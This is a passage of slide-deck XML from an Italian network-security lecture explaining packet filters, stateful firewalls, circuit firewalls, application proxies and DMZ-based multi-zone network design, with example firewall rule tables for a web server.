          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="940125"/>
            <a:ext cx="8370000" cy="2367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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4838700" y="665925"/>
            <a:ext cx="3531300" cy="274200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF00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CIRCUIT LEVEL FIREWALLS</a:t>
            </a:r>
            <a:endParaRPr b="1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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3131450"/>
            <a:ext cx="6809100" cy="2058600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3277800" y="2857250"/>
            <a:ext cx="3531300" cy="274200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E69138"/>
          </a:solidFill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F3F3F3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>APPLICATION PROXIES</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="F3F3F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AutoNum type="arabicParenR"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Packet Filters (rete)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="Google Shape;387;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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/>
              <a:t>Elaborazione pacchetto per pacchetto.</a:t>
            </a:r>
            <a:endParaRPr u="sng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Decodifica l’intestazione di rete (e parte dell’intestazione del livello di trasporto):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IP sorgente e destinazione</a:t>
            </a:r>
            <a:endParaRPr b="1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Porta sorgente e destinazione</a:t>
            </a:r>
            <a:endParaRPr b="1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Tipo di protocollo</a:t>
            </a:r>
            <a:endParaRPr b="1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Opzioni IP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Senza stato (stateless)</a:t>
            </a:r>
            <a:endParaRPr b="1"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Non può tracciare le connessioni TCP.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Nessuna ispezione (completa) del payload.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Si trova principalmente sui router (le “ACL” nei dispositivi Cisco).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Regola </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>~&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> Reazione</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="393" name="Google Shape;393;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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Indipendentemente dalla sintassi specifica, ogni packet filter di rete permette di esprimere il seguente concetto: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se (il pacchetto corrisponde a una certa condizione) allora esegui questa azione, ad esempio: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blocca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consenti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registra (log)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(altre azioni, ad es. limitazione di banda)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2) Stateful (o Dynamic) Packet Filters</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="399" name="Google Shape;399;p4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Includono i packet filter di rete, e in più:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-406400" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="120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tengono traccia dello stato de</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>lla connessione TCP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it"/>
              <a:t>dopo un SYN deve seguire un SYN-ACK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è possibile tracciare le connessioni senza aggiungere una regola di risposta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it"/>
              <a:t>rendono le regole di bloccaggio più sicure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u="sng"/>
              <a:t>Esempio</a:t>
            </a:r>
            <a:endParaRPr u="sng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4" name="Google Shape;404;p47"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="393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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="6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5" name="Google Shape;405;p47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875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06" name="Google Shape;406;p47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717475" y="2224550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07" name="Google Shape;407;p47"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="405" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975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10" name="Google Shape;410;p47"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="406" idx="0"/>
            <a:endCxn id="408" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400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7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="408" idx="3"/>
            <a:endCxn id="412" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500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7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="409" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="24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47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675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15" name="Google Shape;415;p47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275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16" name="Google Shape;416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Stateless Packet Filter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1" name="Google Shape;421;p48"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="393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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="6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2" name="Google Shape;422;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875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23" name="Google Shape;423;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717475" y="2224550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24" name="Google Shape;424;p48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="422" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975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48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975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27" name="Google Shape;427;p48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="423" idx="0"/>
            <a:endCxn id="425" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400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48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="425" idx="3"/>
            <a:endCxn id="429" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500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48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="426" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="24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48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675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32" name="Google Shape;432;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275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33" name="Google Shape;433;p4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Stateless Packet Filter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8" name="Google Shape;438;p49"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="393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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="6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-&gt; WWW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9" name="Google Shape;439;p49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875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40" name="Google Shape;440;p49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717475" y="2224550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41" name="Google Shape;441;p49"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="439" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975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49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975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44" name="Google Shape;444;p49"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="440" idx="0"/>
            <a:endCxn id="442" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400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9"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="442" idx="3"/>
            <a:endCxn id="446" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500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9"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="443" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="24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49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675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49" name="Google Shape;449;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275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50" name="Google Shape;450;p4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Stateless Packet Filter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5" name="Google Shape;455;p50"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="393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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="6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-&gt; WWW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WS_IP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 incoming connection to the WS on PORT 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56" name="Google Shape;456;p50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875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1717475" y="2224550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58" name="Google Shape;458;p50"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="456" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975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61" name="Google Shape;461;p50"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="457" idx="0"/>
            <a:endCxn id="459" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400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0"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="459" idx="3"/>
            <a:endCxn id="463" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500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0"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="460" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="24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50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675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66" name="Google Shape;466;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275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67" name="Google Shape;467;p5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Stateless Packet Filter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2" name="Google Shape;472;p51"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="393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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="6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-&gt; WWW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WS_IP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 incoming connection to the WS on PORT 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WS_IP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-&gt; WWW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 outgoing connection from the WS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3" name="Google Shape;473;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875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74" name="Google Shape;474;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717475" y="2224550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75" name="Google Shape;475;p51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="473" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975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51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975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78" name="Google Shape;478;p51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="474" idx="0"/>
            <a:endCxn id="476" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400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51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="476" idx="3"/>
            <a:endCxn id="480" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500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51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="477" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="24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51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675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83" name="Google Shape;483;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275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84" name="Google Shape;484;p5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Stateless Packet Filter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9" name="Google Shape;489;p52"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="314525" y="3930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830100"/>
                <a:gridCol w="1153075"/>
                <a:gridCol w="491250"/>
                <a:gridCol w="1037075"/>
                <a:gridCol w="1400975"/>
                <a:gridCol w="655000"/>
                <a:gridCol w="764150"/>
                <a:gridCol w="2183325"/>
              </a:tblGrid>
              <a:tr h="63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1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b="1" sz="11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-&gt; WWW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 on all firewalls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WWW -&gt; Local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WS_IP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>
                          <a:solidFill>
                            <a:srgbClr val="0000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 incoming connection to the WS on PORT 80</a:t>
                      </a:r>
                      <a:endParaRPr b="1" i="1" sz="1100">
                        <a:solidFill>
                          <a:srgbClr val="0000FF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WS_IP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Local -&gt; WWW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it" sz="1100" strike="sngStrike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 outgoing connection from the WS</a:t>
                      </a:r>
                      <a:endParaRPr b="1" i="1" sz="1100" strike="sngStrike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0" name="Google Shape;490;p52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571775" y="1391875"/>
            <a:ext cx="11457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REMOTE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91" name="Google Shape;491;p52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717475" y="2224550"/>
            <a:ext cx="1366632" cy="1055700"/>
          </a:xfrm>
          <a:prstGeom prst="cloud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Internet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92" name="Google Shape;492;p52"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="490" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1144625" y="1882975"/>
            <a:ext cx="695700" cy="65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52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657050" y="1760150"/>
            <a:ext cx="81900" cy="1988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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3954275" y="2021975"/>
            <a:ext cx="1011600" cy="491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WS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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="495" name="Google Shape;495;p52"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="491" idx="0"/>
            <a:endCxn id="493" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3082968" y="2752400"/>
            <a:ext cx="574200" cy="2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52"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="493" idx="3"/>
            <a:endCxn id="497" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738950" y="2754500"/>
            <a:ext cx="1658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52"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="494" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4460075" y="2513075"/>
            <a:ext cx="15300" cy="245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52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3414075" y="1361675"/>
            <a:ext cx="5742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FW1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500" name="Google Shape;500;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866975" y="2928275"/>
            <a:ext cx="128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Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Local Network </a:t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501" name="Google Shape;501;p5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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stateful</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> Packet Filter</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="Google Shape;502;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5771475" y="1536625"/>
            <a:ext cx="30609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>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Non occorre una regola per la risposta.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Stateful Packet Filters</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="508" name="Google Shape;508;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="48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Include filtri di pacchetti di rete e inoltre:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-36639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it"/>
              <a:t>Maggiore sicurezza grazie al tracciamento dello stato TCP</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Sapere in che fase si trova una connessione (SYN, SYN-ACK, ESTABLISHED, ecc.) consente di accettare o bloccare traffico in modo più intelligente. Questo previene certi tipi di attacchi.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it"/>
              <a:t>Non servono regole di risposta dedicate</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Poiché il firewall riconosce automaticamente il traffico di ritorno associato a una connessione già autorizzata, le configurazioni diventano più semplici e meno soggette a errori.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-36639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it"/>
              <a:t>Regole di blocco più sicure</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Quando si blocca qualcosa, lo si fa conoscendo il contesto della connessione. Questo evita che pacchetti malevoli sfruttino eccezioni o stati intermedi non previsti.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3) Circuit Firewall (Obsoleto)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="514" name="Google Shape;514;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536625"/>
            <a:ext cx="8520600" cy="48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circuit firewall serve principalmente a controllare se due parti possono avviare una comunicazione, senza preoccuparsi dei dettagli di ciò che si scambieranno dopo.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L’idea è:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3397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1" lang="it"/>
              <a:t>Controllare l’inizio della comunicazione</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Il firewall verifica se la connessione può partire: chi sei, da dove vieni, a cosa ti vuoi collegare.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it"/>
              <a:t>Stabilire un “canale autorizzato</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>”</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Se tutto è ok, il firewall crea un circuito (un collegamento) valido tra chi chiede e la destinazione.</a:t>
            </a:r>
            <a:endParaRPr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it"/>
              <a:t>Lasciare che la comunicazione prosegua senza analizzare ogni messaggio</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Una volta aperto il circuito, il traffico scorre senza controlli complessi: il firewall non guarda dentro ogni singolo scambio.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4) Application Proxies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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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Operano principalmente sul contenuto del livello applicativo. In poche parole, decidono se un messaggio passa o non passa in base al contenuto.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Alcuni attacchi prevedono dei caratteri speciali o delle parole (', SCRIPT, ecc.), e possono evitare che tali messaggi arrivino a destinazione.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Se il livello applicativo è cifrato (esempio, HTTPS) non possono fare nulla. L’unica soluzione è avere lo stesso certificato sui dispositivi dietro la rete e sul firewall.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Multi-zone architecture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="526" name="Google Shape;526;p5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Problema</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: se mescoliamo server accessibili dall’esterno con i client interni, riduciamo la sicurezza della rete interna.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Soluzione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: permettere l’accesso esterno solo ai server esposti, ma non alla rete interna.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/>
              <a:t>Idea generale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: suddividere la rete in livelli di privilegio. Utilizzare firewall per regolare gli accessi.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Multi-zone architecture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="532" name="Google Shape;532;p5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 pratica si crea una zona semi-pubblica chiamata </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>DMZ (demilitarized zone)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La DMZ ospita i server pubblici (web, FTP, DNS pubblico, SMTP in ingresso).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Nella DMZ non devono trovarsi dati critici o insostituibili.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La DMZ è quasi rischiosa quanto Internet.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Multi-zone architecture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="538" name="Google Shape;538;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435899" y="30083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58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3432899" y="1808125"/>
            <a:ext cx="219900" cy="1307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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7362547" y="1378825"/>
            <a:ext cx="242100" cy="2188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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599499" y="195032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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6540249" y="1950313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network Z1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58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898124" y="2646375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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7309599" y="2843250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58"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="538" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2435579" y="3671225"/>
            <a:ext cx="626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6" name="Google Shape;546;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438724" y="4015700"/>
            <a:ext cx="12312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8"/>
          <p:cNvSpPr/>
